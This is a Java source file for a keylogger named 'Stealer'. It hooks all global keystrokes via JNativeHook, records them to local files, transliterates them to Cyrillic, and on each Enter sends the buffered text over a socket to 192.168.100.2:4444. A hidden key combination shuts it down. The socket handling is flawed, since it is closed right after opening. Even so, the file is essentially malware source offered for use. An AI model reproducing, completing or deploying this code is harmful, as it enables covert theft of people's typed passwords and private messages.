import com.sun.org.apache.xalan.internal.xsltc.dom.SimpleResultTreeImpl;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import javax.swing.*;
import javax.xml.crypto.Data;
import java.awt.*;
import java.awt.event.KeyEvent;
import java.awt.im.InputContext;
import java.io.*;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.List;

public class start{
    public static void main(String[] args) {
        Stealer stealer = new Stealer();
        GlobalScreen.addNativeKeyListener(stealer);
        stealer.start();
//        Grafon grafon = new Grafon();
    }
    public static void run(){
        Stealer stealer = new Stealer();
        GlobalScreen.addNativeKeyListener(stealer);
        stealer.start();
    }
}

class Stealer implements NativeKeyListener {
    private boolean capsLook = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);
    private boolean shiftPresed = false;
    private String exit = "";
    private boolean forExit = false;
    String time = new SimpleDateFormat("yyyy!MM!dd HH!mm!ss").format(Calendar.getInstance().getTime());

    private List<String> list = new ArrayList<>();
    private Map<String, String> listOfLiterals = new TreeMap<>();
    private String rusText = "";
    private String engText = "";
    private String buferRus = "";
    private String buferEng = "";

    private Socket socket;
    private InputStream inputStream;
    private OutputStream outputStream;
    private Scanner scanner;

    public Stealer(){
        listOfLiterals.put("q","й");
        listOfLiterals.put("w","ц");
        listOfLiterals.put("e","у");
        listOfLiterals.put("r","к");
        listOfLiterals.put("t","е");
        listOfLiterals.put("y","н");
        listOfLiterals.put("u","г");
        listOfLiterals.put("i","ш");
        listOfLiterals.put("o","щ");
        listOfLiterals.put("p","з");
        listOfLiterals.put("open bracket","х");
        listOfLiterals.put("close bracket","ъ");
        listOfLiterals.put("a","ф");
        listOfLiterals.put("s","ы");
        listOfLiterals.put("d","в");
        listOfLiterals.put("f","а");
        listOfLiterals.put("g","п");
        listOfLiterals.put("h","р");
        listOfLiterals.put("j","о");
        listOfLiterals.put("k","л");
        listOfLiterals.put("l","д");
        listOfLiterals.put("semicolon","ж");
        listOfLiterals.put("quote","э");
        listOfLiterals.put("z","я");
        listOfLiterals.put("x","ч");
        listOfLiterals.put("c","с");
        listOfLiterals.put("v","м");
        listOfLiterals.put("b","и");
        listOfLiterals.put("n","т");
        listOfLiterals.put("m","ь");
        listOfLiterals.put("comma","б");
        listOfLiterals.put("period","ю");

        try {
            socket =  new Socket("192.168.100.2",4444);
            inputStream = socket.getInputStream();
            scanner = new Scanner(inputStream);
            outputStream = socket.getOutputStream();
        } catch (IOException e) {
            e.printStackTrace();
        }
        finally {
            try {
                socket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public void start(){
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        // не работает
    }
    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
        if(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).equalsIgnoreCase("shift")){
            shiftPresed = false;
        }
    }
    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        try(FileWriter fileWriterEng = new FileWriter(new File("eng" + time + ".txt"), true);
            ){
            logic(fileWriterEng, nativeKeyEvent);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void logic(FileWriter fileWriterEng, NativeKeyEvent nativeKeyEvent) throws IOException{
        forExit = false;
        if(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).equalsIgnoreCase("shift")){
            shiftPresed = true;

            if(exit.equalsIgnoreCase("")){
                exit += "shift";
                forExit = true;
            }
            else if(exit.equalsIgnoreCase("shiftCaps Lock")){
                System.exit(1);   // for exit shift--caps--shift
            }
        }
        else if(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).equalsIgnoreCase("Caps Lock")){
            if(capsLook){
                capsLook = false;
            }
            else {
                capsLook = true;
            }

            if(exit.equalsIgnoreCase("shift")){
                exit += "Caps Lock";
                forExit = true;
            }
        }
        else if(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).equalsIgnoreCase("enter")){
            fileWriterEng.write("\n");
            list.add(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
            rusText += "\n";
            buferRus += "\n";
            buferEng += "\n";

            outputStream.write(("ENG: " + buferEng + "\n").getBytes());
            outputStream.flush();
            outputStream.write(("RUS: " + buferRus + "\n").getBytes());
            outputStream.flush();
            buferRus = "";
            buferEng = "";
        }
        else if(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).equalsIgnoreCase("space")){
            fileWriterEng.write(" ");
            rusText += " ";
            buferRus += " ";
            buferEng += " ";
        }
        else {
            String str = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
            if(capsLook ^ shiftPresed){
                list.add(str.toUpperCase());
                fileWriterEng.write(str.toUpperCase());
                buferEng += str.toUpperCase();
                if(listOfLiterals.containsKey(str.toLowerCase())){
                    rusText += listOfLiterals.get(str.toLowerCase()).toUpperCase();
                    buferRus += listOfLiterals.get(str.toLowerCase()).toUpperCase();
                }
                else {
                    rusText += str;
                    buferRus += str;
                }
            }
            else {
                list.add(str.toLowerCase());
                fileWriterEng.write(str.toLowerCase());
                buferEng += str.toLowerCase();
                if(listOfLiterals.containsKey(str.toLowerCase())){
                    rusText += listOfLiterals.get(str.toLowerCase());
                    buferRus += listOfLiterals.get(str.toLowerCase());
                }
                else {
                    rusText += str;
                    buferRus += str;
                }
            }
            if(!forExit){
                exit = "";
            }
        }
        try(PrintWriter printWriter = new PrintWriter("rus" + time + ".txt", "cp1251")){
            printWriter.write(rusText);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
class Grafon extends JFrame{
    Grafon(){
        setVisible(true);
        setSize(200,200);
    }
}
